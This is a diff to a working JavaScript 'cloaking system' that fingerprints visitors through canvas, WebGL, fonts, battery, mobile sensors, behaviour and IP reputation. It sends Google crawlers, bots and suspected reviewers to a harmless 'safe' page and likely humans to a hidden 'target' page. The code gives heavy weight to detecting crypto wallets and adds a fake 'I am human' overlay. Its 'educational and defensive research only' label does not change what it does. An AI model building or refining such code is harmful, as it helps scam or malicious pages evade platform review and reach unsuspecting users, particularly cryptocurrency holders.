@@ -1,16 +1,18 @@
 /**
- * Advanced Cloaking System v4.0 – Desktop / Mobile Optimized
+ * Advanced Cloaking System v4.0 – Desktop / Mobile Split
  * For educational and defensive research only.
  *
- * Features:
- * - Desktop: heavy weights on wallet, battery presence, and behavioral tracking.
- * - Mobile: adds dynamic signals: battery level change over time, ambient light,
- *   proximity, and orientation changes. These are strong indicators of a real device.
- * - Multi‑layer fingerprinting common to both (canvas, WebGL, audio, fonts, etc.)
- * - IP reputation (public IP, datacenter/VPN detection via external API)
- * - Headless / automation detection
- * - Language/timezone consistency
- * - Reviewer pattern detection (optional safe fallback)
+ * Desktop: heavy weights on wallet, battery, behavioral tracking.
+ * Mobile: uses sensor APIs (battery discharge, ambient light, orientation, proximity)
+ *         plus a human verification button.
+ *
+ * Configuration:
+ *   safePageUrl        – URL for bots/reviewers (default: '/safe')
+ *   targetPageUrl      – URL for humans (default: '/target')
+ *   strictnessLevel    – minimum human score (default: 55)
+ *   debugMode          – print logs (default: false)
+ *   usePublicIpService – use ipify.org (default: true)
+ *   weights            – custom weight overrides (optional)
  */
 
 class AdvancedCloakingSystem {
@@ -18,19 +20,21 @@ class AdvancedCloakingSystem {
         this.config = {
             safePageUrl: config.safePageUrl || '/safe',
             targetPageUrl: config.targetPageUrl || '/target',
-            strictnessLevel: config.strictnessLevel || 55,   // same for both, but scoring differs
+            strictnessLevel: config.strictnessLevel || 55,
             debugMode: config.debugMode || false,
             usePublicIpService: config.usePublicIpService !== undefined ? config.usePublicIpService : true,
-            dynamicSignalDelay: config.dynamicSignalDelay || 3000, // ms to collect mobile sensor changes
             ...config
         };
 
-        // Desktop weights (high on wallet, battery, behavior)
-        this.desktopWeights = {
+        // Base weights (desktop‑focused, will be overridden for mobile)
+        this.weights = {
+            // Desktop heavy signals
             wallet: 50,
             battery: 20,
             batteryCharging: 5,
             behavior: 60,
+
+            // Desktop minor signals
             plugins: { many: 5, none: -2 },
             fonts: { many: 5, few: -2 },
             canvasError: -5,
@@ -41,31 +45,16 @@ class AdvancedCloakingSystem {
             langTzMismatch: -5,
             googleIp: -50,
             proxyVpn: -10,
-            residentialIp: 5
-        };
+            residentialIp: 5,
 
-        // Mobile weights – wallet and battery still strong, plus new sensor signals
-        this.mobileWeights = {
-            wallet: 40,                 // slightly less than desktop because we have other strong signals
-            battery: 15,                // static battery presence
-            batteryCharging: 3,
-            batteryChange: 20,           // level changed during session
-            orientationChange: 15,        // screen rotated
-            ambientLight: 10,             // ambient light sensor available
-            proximity: 10,                // proximity sensor available
-            behavior: 40,                 // behavior still useful but less weight
-            // lower impact from generic fingerprint (mobile browsers are more uniform)
-            plugins: { many: 3, none: -1 },
-            fonts: { many: 3, few: -1 },
-            canvasError: -3,
-            softwareRenderer: -5,
-            highConcurrency: 2,
-            mobileResolution: 8,          // already mobile, so extra bonus
-            touchConsistent: 5,
-            langTzMismatch: -5,
-            googleIp: -50,
-            proxyVpn: -10,
-            residentialIp: 5
+            // Mobile‑specific weights (will be added if on mobile)
+            batteryDischarge: 30,
+            ambientLight: 25,
+            orientationChange: 20,
+            proximity: 25,
+            humanButton: 50,
+
+            ...config.weights
         };
 
         // Detection databases
@@ -74,7 +63,7 @@ class AdvancedCloakingSystem {
         this.vpnIPRanges = this.initializeVPNIPs();
         this.proxyIPRanges = this.initializeProxyIPs();
 
-        // Behavioral data (common)
+        // Behavioral data
         this.behavior = {
             startTime: Date.now(),
             maxScroll: 0,
@@ -83,30 +72,35 @@ class AdvancedCloakingSystem {
             timeToFirstInteraction: null
         };
 
-        // Mobile dynamic signals storage
-        this.mobileSignals = {
-            batteryInitialLevel: null,
-            batteryChanged: false,
+        // Mobile sensor data
+        this.mobileSensors = {
+            batteryStartLevel: null,
+            batteryStartTime: null,
+            batteryEndLevel: null,
+            batteryEndTime: null,
+            ambientLight: null,
             orientationChanged: false,
-            ambientLightSupported: false,
-            proximitySupported: false,
-            orientationInitial: null
+            proximityDetected: false,
+            humanButtonClicked: false
         };
 
         this.sessionId = this.generateSessionId();
         this.fingerprint = null;
         this.walletInfo = null;
         this.ipInfo = null;
+        this.isMobile = this.detectMobile();
 
-        this.log('Cloaking system initialized (desktop/mobile split)', 'info');
+        this.log(`Device detected: ${this.isMobile ? 'mobile' : 'desktop'}`, 'info');
+        this.log('Cloaking system initialized', 'info');
     }
 
-    // ---------- Device detection ----------
-    isMobileDevice() {
-        // Check user agent and touch support
+    // ---------- Mobile detection ----------
+    detectMobile() {
         const ua = navigator.userAgent;
         const mobileRegex = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;
-        return mobileRegex.test(ua) || (navigator.maxTouchPoints && navigator.maxTouchPoints > 1);
+        const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+        const smallScreen = screen.width < 1024;
+        return mobileRegex.test(ua) || (hasTouch && smallScreen);
     }
 
     // ---------- Bot signature database ----------
@@ -146,7 +140,7 @@ class AdvancedCloakingSystem {
                Math.random().toString(36).substring(2, 15);
     }
 
-    // ---------- Wallet detection ----------
+    // ---------- Wallet detection (common) ----------
     detectWallet() {
         const wallet = {
             present: false,
@@ -314,7 +308,7 @@ class AdvancedCloakingSystem {
         };
     }
 
-    // ---------- Core fingerprint (common) ----------
+    // ---------- Comprehensive fingerprint ----------
     async generateFingerprint() {
         const screen = this.getScreenMetrics();
         return {
@@ -335,7 +329,7 @@ class AdvancedCloakingSystem {
             plugins: this.getPluginList(),
             audio: await this.getAudioFingerprint(),
             webRTC: this.getWebRTCInfo(),
-            battery: await this.getBatteryInfo(),   // initial battery snapshot
+            battery: await this.getBatteryInfo(),
             permissions: await this.getPermissionsInfo(),
             timestamp: Date.now()
         };
@@ -468,13 +462,6 @@ class AdvancedCloakingSystem {
         if ('getBattery' in navigator) {
             try {
                 const battery = await navigator.getBattery();
-                // Store initial level for later change detection on mobile
-                if (this.isMobileDevice()) {
-                    this.mobileSignals.batteryInitialLevel = battery.level;
-                    battery.addEventListener('levelchange', () => {
-                        this.mobileSignals.batteryChanged = true;
-                    });
-                }
                 return {
                     supported: true,
                     charging: battery.charging,
@@ -505,47 +492,137 @@ class AdvancedCloakingSystem {
         return results;
     }
 
-    // ---------- Mobile‑specific sensor detection ----------
-    async setupMobileSensors() {
-        // Orientation change listener
-        if (screen.orientation) {
-            this.mobileSignals.orientationInitial = screen.orientation.type;
-            screen.orientation.addEventListener('change', () => {
-                this.mobileSignals.orientationChanged = true;
-            });
-        }
+    // ---------- Mobile sensor methods ----------
+    async monitorBatteryDischarge() {
+        if (!('getBattery' in navigator)) return;
+        try {
+            const battery = await navigator.getBattery();
+            this.mobileSensors.batteryStartLevel = battery.level;
+            this.mobileSensors.batteryStartTime = Date.now();
 
-        // Ambient Light Sensor (if available)
+            // Listen for level changes
+            battery.addEventListener('levelchange', () => {
+                this.mobileSensors.batteryEndLevel = battery.level;
+                this.mobileSensors.batteryEndTime = Date.now();
+                this.log(`Battery level changed from ${this.mobileSensors.batteryStartLevel} to ${battery.level}`, 'debug');
+            });
+        } catch (e) {
+            this.log(`Battery monitoring failed: ${e.message}`, 'error');
+        }
+    }
+
+    async getAmbientLight() {
+        // Try AmbientLightSensor API
         if ('AmbientLightSensor' in window) {
             try {
                 const sensor = new AmbientLightSensor();
                 sensor.addEventListener('reading', () => {
-                    // Just having a reading is enough; we don't need the value
-                    this.mobileSignals.ambientLightSupported = true;
-                    sensor.stop();
+                    this.mobileSensors.ambientLight = sensor.illuminance;
+                    this.log(`Ambient light: ${sensor.illuminance} lux`, 'debug');
                 });
                 sensor.start();
-                // Also set a timeout in case sensor doesn't fire quickly
-                setTimeout(() => sensor.stop(), 1000);
+                // Give it a moment to read
+                await new Promise(resolve => setTimeout(resolve, 500));
+                sensor.stop();
             } catch (e) {
                 this.log(`AmbientLightSensor error: ${e.message}`, 'debug');
             }
         }
-
-        // Proximity Sensor (if available)
-        if ('ProximitySensor' in window) {
-            try {
-                const sensor = new ProximitySensor();
-                sensor.addEventListener('reading', () => {
-                    this.mobileSignals.proximitySupported = true;
-                    sensor.stop();
-                });
-                sensor.start();
-                setTimeout(() => sensor.stop(), 1000);
-            } catch (e) {
-                this.log(`ProximitySensor error: ${e.message}`, 'debug');
-            }
+        // Fallback: check for devicelight event (older)
+        if (this.mobileSensors.ambientLight === null && 'ondevicelight' in window) {
+            window.addEventListener('devicelight', (event) => {
+                this.mobileSensors.ambientLight = event.value;
+                this.log(`Devicelight event: ${event.value} lux`, 'debug');
+            }, { once: true });
+            // Wait a bit
+            await new Promise(resolve => setTimeout(resolve, 500));
         }
+    }
+
+    monitorOrientation() {
+        if ('screen' in window && 'orientation' in screen) {
+            screen.orientation.addEventListener('change', () => {
+                this.mobileSensors.orientationChanged = true;
+                this.log('Orientation changed', 'debug');
+            });
+        } else {
+            // Fallback: listen to resize events that might indicate orientation change
+            let lastWidth = screen.width;
+            window.addEventListener('resize', () => {
+                if (screen.width !== lastWidth) {
+                    this.mobileSensors.orientationChanged = true;
+                    lastWidth = screen.width;
+                    this.log('Orientation change detected via resize', 'debug');
+                }
+            });
+        }
+    }
+
+    async getProximity() {
+        // Try DeviceProximityEvent
+        if ('DeviceProximityEvent' in window) {
+            window.addEventListener('deviceproximity', (event) => {
+                this.mobileSensors.proximityDetected = true;
+                this.log(`Proximity: ${event.value} cm`, 'debug');
+            }, { once: true });
+            await new Promise(resolve => setTimeout(resolve, 500));
+        }
+        // Also check for UserProximityEvent (simpler on/off)
+        if ('UserProximityEvent' in window) {
+            window.addEventListener('userproximity', (event) => {
+                if (event.near) {
+                    this.mobileSensors.proximityDetected = true;
+                    this.log('User proximity detected', 'debug');
+                }
+            }, { once: true });
+            await new Promise(resolve => setTimeout(resolve, 500));
+        }
+    }
+
+    showHumanVerificationButton() {
+        return new Promise((resolve) => {
+            // Create a simple overlay button
+            const overlay = document.createElement('div');
+            overlay.style.position = 'fixed';
+            overlay.style.top = '0';
+            overlay.style.left = '0';
+            overlay.style.width = '100%';
+            overlay.style.height = '100%';
+            overlay.style.backgroundColor = 'rgba(0,0,0,0.8)';
+            overlay.style.display = 'flex';
+            overlay.style.justifyContent = 'center';
+            overlay.style.alignItems = 'center';
+            overlay.style.zIndex = '10000';
+            overlay.style.flexDirection = 'column';
+            overlay.style.color = 'white';
+            overlay.style.fontFamily = 'Arial, sans-serif';
+
+            const message = document.createElement('p');
+            message.innerText = 'Please verify you are human';
+            message.style.marginBottom = '20px';
+            message.style.fontSize = '18px';
+
+            const button = document.createElement('button');
+            button.innerText = 'I am human';
+            button.style.padding = '15px 30px';
+            button.style.fontSize = '18px';
+            button.style.backgroundColor = '#ff6b00';
+            button.style.color = 'white';
+            button.style.border = 'none';
+            button.style.borderRadius = '8px';
+            button.style.cursor = 'pointer';
+
+            button.addEventListener('click', () => {
+                this.mobileSensors.humanButtonClicked = true;
+                this.log('Human verification button clicked', 'info');
+                document.body.removeChild(overlay);
+                resolve();
+            });
+
+            overlay.appendChild(message);
+            overlay.appendChild(button);
+            document.body.appendChild(overlay);
+        });
     }
 
     // ---------- Behavioral tracking (common) ----------
@@ -606,128 +683,197 @@ class AdvancedCloakingSystem {
         if (session.mouseMoves > 0) score += 15;
         if (session.clicks > 0) score += 20;
         if (session.timeToFirstInteraction && session.timeToFirstInteraction < 5000) score += 10;
-        return score; // will be capped later by weight
+        return Math.min(this.weights.behavior, score);
     }
 
-    // ---------- Desktop scoring ----------
+    // ---------- Weighted scoring (branch by device) ----------
+    calculateHumanScore(ipInfo, fingerprint, wallet, behaviorScore) {
+        if (this.isMobile) {
+            return this.calculateMobileScore(ipInfo, fingerprint, wallet, behaviorScore);
+        } else {
+            return this.calculateDesktopScore(ipInfo, fingerprint, wallet, behaviorScore);
+        }
+    }
+
     calculateDesktopScore(ipInfo, fingerprint, wallet, behaviorScore) {
         let score = 0;
-        const w = this.desktopWeights;
-        const log = [];
+        const w = this.weights;
+        const weightsLog = [];
 
-        if (wallet.present) { score += w.wallet; log.push(`wallet:+${w.wallet}`); }
-
-        if (fingerprint.battery?.supported && typeof fingerprint.battery.level === 'number') {
-            score += w.battery; log.push(`battery:+${w.battery}`);
-            if ('charging' in fingerprint.battery) { score += w.batteryCharging; log.push(`battery_charging:+${w.batteryCharging}`); }
+        // Wallet
+        if (wallet.present) {
+            score += w.wallet;
+            weightsLog.push(`wallet:+${w.wallet}`);
         }
 
-        if (ipInfo.isGoogle) { score += w.googleIp; log.push(`google_ip:${w.googleIp}`); }
-        else {
-            if (ipInfo.isProxy || ipInfo.isVPN) { score += w.proxyVpn; log.push(`proxy/vpn:${w.proxyVpn}`); }
-            if (ipInfo.connectionType === 'residential') { score += w.residentialIp; log.push(`residential_ip:+${w.residentialIp}`); }
-        }
-
-        // browser fingerprint (low impact)
-        if (fingerprint.plugins) {
-            if (fingerprint.plugins.length > 2) { score += w.plugins.many; log.push(`plugins>2:+${w.plugins.many}`); }
-            else if (fingerprint.plugins.length === 0) { score += w.plugins.none; log.push(`no_plugins:${w.plugins.none}`); }
-        }
-
-        if (fingerprint.fonts) {
-            if (fingerprint.fonts.length > 10) { score += w.fonts.many; log.push(`fonts>10:+${w.fonts.many}`); }
-            else if (fingerprint.fonts.length < 5) { score += w.fonts.few; log.push(`fonts<5:${w.fonts.few}`); }
-        }
-
-        if (fingerprint.canvas?.hash === 'canvas_error') { score += w.canvasError; log.push(`canvas_error:${w.canvasError}`); }
-
-        if (fingerprint.webgl?.renderer) {
-            const r = fingerprint.webgl.renderer.toLowerCase();
-            if (r.includes('swiftshader') || r.includes('llvmpipe') || r.includes('mesa')) {
-                score += w.softwareRenderer; log.push(`software_renderer:${w.softwareRenderer}`);
+        // Battery
+        if (fingerprint.battery && fingerprint.battery.supported && typeof fingerprint.battery.level === 'number') {
+            score += w.battery;
+            weightsLog.push(`battery:+${w.battery}`);
+            if ('charging' in fingerprint.battery) {
+                score += w.batteryCharging;
+                weightsLog.push(`battery_charging:+${w.batteryCharging}`);
             }
         }
 
-        if (fingerprint.hardwareConcurrency > 2) { score += w.highConcurrency; log.push(`concurrency>2:+${w.highConcurrency}`); }
+        // IP signals
+        if (ipInfo.isGoogle) {
+            score += w.googleIp;
+            weightsLog.push(`google_ip:${w.googleIp}`);
+        } else {
+            if (ipInfo.isProxy || ipInfo.isVPN) {
+                score += w.proxyVpn;
+                weightsLog.push(`proxy/vpn:${w.proxyVpn}`);
+            }
+            if (ipInfo.connectionType === 'residential') {
+                score += w.residentialIp;
+                weightsLog.push(`residential_ip:+${w.residentialIp}`);
+            }
+        }
+
+        // Browser fingerprint (low impact)
+        if (fingerprint.plugins && fingerprint.plugins.length > 2) {
+            score += w.plugins.many;
+            weightsLog.push(`plugins>2:+${w.plugins.many}`);
+        } else if (fingerprint.plugins && fingerprint.plugins.length === 0) {
+            score += w.plugins.none;
+            weightsLog.push(`no_plugins:${w.plugins.none}`);
+        }
+
+        if (fingerprint.fonts && fingerprint.fonts.length > 10) {
+            score += w.fonts.many;
+            weightsLog.push(`fonts>10:+${w.fonts.many}`);
+        } else if (fingerprint.fonts && fingerprint.fonts.length < 5) {
+            score += w.fonts.few;
+            weightsLog.push(`fonts<5:${w.fonts.few}`);
+        }
+
+        if (fingerprint.canvas && fingerprint.canvas.hash === 'canvas_error') {
+            score += w.canvasError;
+            weightsLog.push(`canvas_error:${w.canvasError}`);
+        }
+
+        if (fingerprint.webgl && fingerprint.webgl.renderer) {
+            const renderer = fingerprint.webgl.renderer.toLowerCase();
+            if (renderer.includes('swiftshader') || renderer.includes('llvmpipe') || renderer.includes('mesa')) {
+                score += w.softwareRenderer;
+                weightsLog.push(`software_renderer:${w.softwareRenderer}`);
+            }
+        }
+
+        if (fingerprint.hardwareConcurrency && fingerprint.hardwareConcurrency > 2) {
+            score += w.highConcurrency;
+            weightsLog.push(`concurrency>2:+${w.highConcurrency}`);
+        }
 
         const { width, height } = fingerprint.screen;
-        if (width < 1024 && height < 768) { score += w.mobileResolution; log.push(`mobile_res:+${w.mobileResolution}`); }
+        if (width < 1024 && height < 768) {
+            score += w.mobileResolution;
+            weightsLog.push(`mobile_res:+${w.mobileResolution}`);
+        }
 
-        const isMobile = this.isMobileDevice();
-        if (fingerprint.screen.touchSupport === isMobile) { score += w.touchConsistent; log.push(`touch_consistent:+${w.touchConsistent}`); }
+        const isMobile = /Mobi|Android/i.test(navigator.userAgent);
+        if (fingerprint.screen.touchSupport === isMobile) {
+            score += w.touchConsistent;
+            weightsLog.push(`touch_consistent:+${w.touchConsistent}`);
+        }
 
-        const lang = this.checkLanguageConsistency();
-        if (!lang.consistent) { score += w.langTzMismatch; log.push(`lang/tz_mismatch:${w.langTzMismatch}`); }
+        const langConsistency = this.checkLanguageConsistency();
+        if (!langConsistency.consistent) {
+            score += w.langTzMismatch;
+            weightsLog.push(`lang/tz_mismatch:${w.langTzMismatch}`);
+        }
 
+        // Behavioral score
         score += behaviorScore;
-        log.push(`behavior:+${behaviorScore}`);
+        weightsLog.push(`behavior:+${behaviorScore}`);
 
         score = Math.min(100, Math.max(0, score));
-        this.log(`Desktop score: ${score} (${log.join(', ')})`, 'debug');
+        this.log(`Desktop score components: ${weightsLog.join(', ')}`, 'debug');
         return score;
     }
 
-    // ---------- Mobile scoring ----------
-    calculateMobileScore(ipInfo, fingerprint, wallet, behaviorScore, mobileSignals) {
+    calculateMobileScore(ipInfo, fingerprint, wallet, behaviorScore) {
         let score = 0;
-        const w = this.mobileWeights;
-        const log = [];
+        const w = this.weights;
+        const weightsLog = [];
 
-        if (wallet.present) { score += w.wallet; log.push(`wallet:+${w.wallet}`); }
-
-        if (fingerprint.battery?.supported && typeof fingerprint.battery.level === 'number') {
-            score += w.battery; log.push(`battery:+${w.battery}`);
-            if ('charging' in fingerprint.battery) { score += w.batteryCharging; log.push(`battery_charging:+${w.batteryCharging}`); }
-        }
-        if (mobileSignals.batteryChanged) { score += w.batteryChange; log.push(`battery_changed:+${w.batteryChange}`); }
-
-        if (mobileSignals.orientationChanged) { score += w.orientationChange; log.push(`orientation_changed:+${w.orientationChange}`); }
-        if (mobileSignals.ambientLightSupported) { score += w.ambientLight; log.push(`ambient_light:+${w.ambientLight}`); }
-        if (mobileSignals.proximitySupported) { score += w.proximity; log.push(`proximity:+${w.proximity}`); }
-
-        // IP
-        if (ipInfo.isGoogle) { score += w.googleIp; log.push(`google_ip:${w.googleIp}`); }
-        else {
-            if (ipInfo.isProxy || ipInfo.isVPN) { score += w.proxyVpn; log.push(`proxy/vpn:${w.proxyVpn}`); }
-            if (ipInfo.connectionType === 'residential') { score += w.residentialIp; log.push(`residential_ip:+${w.residentialIp}`); }
+        // Wallet (still valuable)
+        if (wallet.present) {
+            score += w.wallet;
+            weightsLog.push(`wallet:+${w.wallet}`);
         }
 
-        // Browser fingerprint (lower impact)
-        if (fingerprint.plugins) {
-            if (fingerprint.plugins.length > 2) { score += w.plugins.many; log.push(`plugins>2:+${w.plugins.many}`); }
-            else if (fingerprint.plugins.length === 0) { score += w.plugins.none; log.push(`no_plugins:${w.plugins.none}`); }
+        // Battery discharge over time
+        if (this.mobileSensors.batteryStartLevel !== null && this.mobileSensors.batteryEndLevel !== null) {
+            const levelChange = Math.abs(this.mobileSensors.batteryStartLevel - this.mobileSensors.batteryEndLevel);
+            const timeDiff = (this.mobileSensors.batteryEndTime - this.mobileSensors.batteryStartTime) / 1000; // seconds
+            // Realistic discharge: small change over seconds (e.g., 1-2% over 5 sec)
+            if (levelChange > 0 && levelChange < 0.05 && timeDiff > 2) {
+                score += w.batteryDischarge;
+                weightsLog.push(`battery_discharge:+${w.batteryDischarge}`);
+            }
+        } else if (fingerprint.battery && fingerprint.battery.supported) {
+            // If we have battery but no change detected yet, still give a small bonus
+            score += 10;
+            weightsLog.push(`battery_present:+10`);
         }
 
-        if (fingerprint.fonts) {
-            if (fingerprint.fonts.length > 10) { score += w.fonts.many; log.push(`fonts>10:+${w.fonts.many}`); }
-            else if (fingerprint.fonts.length < 5) { score += w.fonts.few; log.push(`fonts<5:${w.fonts.few}`); }
+        // Ambient light
+        if (this.mobileSensors.ambientLight !== null) {
+            score += w.ambientLight;
+            weightsLog.push(`ambient_light:+${w.ambientLight}`);
         }
 
-        if (fingerprint.canvas?.hash === 'canvas_error') { score += w.canvasError; log.push(`canvas_error:${w.canvasError}`); }
+        // Orientation change
+        if (this.mobileSensors.orientationChanged) {
+            score += w.orientationChange;
+            weightsLog.push(`orientation_change:+${w.orientationChange}`);
+        }
 
-        if (fingerprint.webgl?.renderer) {
-            const r = fingerprint.webgl.renderer.toLowerCase();
-            if (r.includes('swiftshader') || r.includes('llvmpipe') || r.includes('mesa')) {
-                score += w.softwareRenderer; log.push(`software_renderer:${w.softwareRenderer}`);
+        // Proximity sensor
+        if (this.mobileSensors.proximityDetected) {
+            score += w.proximity;
+            weightsLog.push(`proximity:+${w.proximity}`);
+        }
+
+        // Human verification button
+        if (this.mobileSensors.humanButtonClicked) {
+            score += w.humanButton;
+            weightsLog.push(`human_button:+${w.humanButton}`);
+        }
+
+        // IP signals (modest)
+        if (ipInfo.isGoogle) {
+            score += w.googleIp;
+            weightsLog.push(`google_ip:${w.googleIp}`);
+        } else {
+            if (ipInfo.isProxy || ipInfo.isVPN) {
+                score += w.proxyVpn;
+                weightsLog.push(`proxy/vpn:${w.proxyVpn}`);
+            }
+            if (ipInfo.connectionType === 'residential') {
+                score += w.residentialIp;
+                weightsLog.push(`residential_ip:+${w.residentialIp}`);
             }
         }
 
-        if (fingerprint.hardwareConcurrency > 2) { score += w.highConcurrency; log.push(`concurrency>2:+${w.highConcurrency}`); }
+        // Minor browser signals (optional)
+        if (fingerprint.plugins && fingerprint.plugins.length === 0) {
+            score += w.plugins.none;
+            weightsLog.push(`no_plugins:${w.plugins.none}`);
+        }
+        if (fingerprint.canvas && fingerprint.canvas.hash === 'canvas_error') {
+            score += w.canvasError;
+            weightsLog.push(`canvas_error:${w.canvasError}`);
+        }
 
-        const { width, height } = fingerprint.screen;
-        if (width < 1024 && height < 768) { score += w.mobileResolution; log.push(`mobile_res:+${w.mobileResolution}`); }
-
-        const isMobile = true; // we're in mobile branch
-        if (fingerprint.screen.touchSupport === isMobile) { score += w.touchConsistent; log.push(`touch_consistent:+${w.touchConsistent}`); }
-
-        const lang = this.checkLanguageConsistency();
-        if (!lang.consistent) { score += w.langTzMismatch; log.push(`lang/tz_mismatch:${w.langTzMismatch}`); }
-
-        score += behaviorScore;
-        log.push(`behavior:+${behaviorScore}`);
+        // Behavioral score (less important on mobile, but still)
+        score += behaviorScore / 2; // reduce impact
+        weightsLog.push(`behavior:${Math.floor(behaviorScore / 2)}`);
 
         score = Math.min(100, Math.max(0, score));
-        this.log(`Mobile score: ${score} (${log.join(', ')})`, 'debug');
+        this.log(`Mobile score components: ${weightsLog.join(', ')}`, 'debug');
         return score;
     }
 
@@ -735,7 +881,7 @@ class AdvancedCloakingSystem {
     async determineVisitorType() {
         this.log('Starting classification', 'debug');
 
-        // ---- Hard checks (common to both) ----
+        // ---- Immediate checks (hard fails) ----
         const ipCheck = await this.checkIPAddress();
         this.ipInfo = ipCheck;
         if (ipCheck.isGoogle) {
@@ -762,8 +908,27 @@ class AdvancedCloakingSystem {
             return { type: 'bot', reason: 'automation', showSafe: true };
         }
 
-        // ---- Wallet detection ----
+        // ---- Soft signals ----
         const wallet = this.detectWallet();
+
+        // If mobile, start sensor monitoring and show verification button
+        if (this.isMobile) {
+            // Start sensor monitoring in parallel
+            this.monitorBatteryDischarge();
+            this.getAmbientLight();
+            this.monitorOrientation();
+            this.getProximity();
+
+            // Show human verification button and wait for click (with timeout)
+            const buttonPromise = this.showHumanVerificationButton();
+            const timeoutPromise = new Promise(resolve => setTimeout(resolve, 10000)); // 10 sec timeout
+            await Promise.race([buttonPromise, timeoutPromise]);
+            if (!this.mobileSensors.humanButtonClicked) {
+                this.log('Human verification button not clicked within timeout', 'warn');
+            }
+        }
+
+        // Behavioral tracking (for both)
         let behaviorScore = 0;
         if (this.hasExistingSession()) {
             behaviorScore = this.analyzeBehavior();
@@ -772,35 +937,20 @@ class AdvancedCloakingSystem {
             this.startBehaviorTracking();
         }
 
-        // ---- Reviewer detection ----
+        // ---- Reviewer detection (optional) ----
         if (this.isPotentialReviewer(fingerprint, ipCheck)) {
             this.log('Potential reviewer → safe', 'info');
             return { type: 'reviewer', reason: 'reviewer_pattern', showSafe: true };
         }
 
-        // ---- Branch: Desktop vs Mobile ----
-        const isMobile = this.isMobileDevice();
-        if (isMobile) {
-            // Set up mobile sensors and wait for possible changes
-            await this.setupMobileSensors();
-            // Wait a short period to catch any sensor events
-            await new Promise(resolve => setTimeout(resolve, this.config.dynamicSignalDelay));
+        // ---- Weighted score (branch) ----
+        const humanScore = this.calculateHumanScore(ipCheck, fingerprint, wallet, behaviorScore);
+        this.log(`Human score: ${humanScore}% (threshold: ${this.config.strictnessLevel})`, 'info');
 
-            const humanScore = this.calculateMobileScore(ipCheck, fingerprint, wallet, behaviorScore, this.mobileSignals);
-            this.log(`Mobile human score: ${humanScore}% (threshold: ${this.config.strictnessLevel})`, 'info');
-            if (humanScore >= this.config.strictnessLevel) {
-                return { type: 'human', score: humanScore, showSafe: false };
-            } else {
-                return { type: 'suspicious', score: humanScore, showSafe: true };
-            }
+        if (humanScore >= this.config.strictnessLevel) {
+            return { type: 'human', score: humanScore, showSafe: false };
         } else {
-            const humanScore = this.calculateDesktopScore(ipCheck, fingerprint, wallet, behaviorScore);
-            this.log(`Desktop human score: ${humanScore}% (threshold: ${this.config.strictnessLevel})`, 'info');
-            if (humanScore >= this.config.strictnessLevel) {
-                return { type: 'human', score: humanScore, showSafe: false };
-            } else {
-                return { type: 'suspicious', score: humanScore, showSafe: true };
-            }
+            return { type: 'suspicious', score: humanScore, showSafe: true };
         }
     }
 
@@ -853,8 +1003,7 @@ class AdvancedCloakingSystem {
         targetPageUrl: '/target',
         strictnessLevel: 55,
         debugMode: true,               // set false in production
-        usePublicIpService: true,
-        dynamicSignalDelay: 3000        // time to collect mobile sensor events (ms)
+        usePublicIpService: true
     });
 
     if (document.readyState === 'loading') {
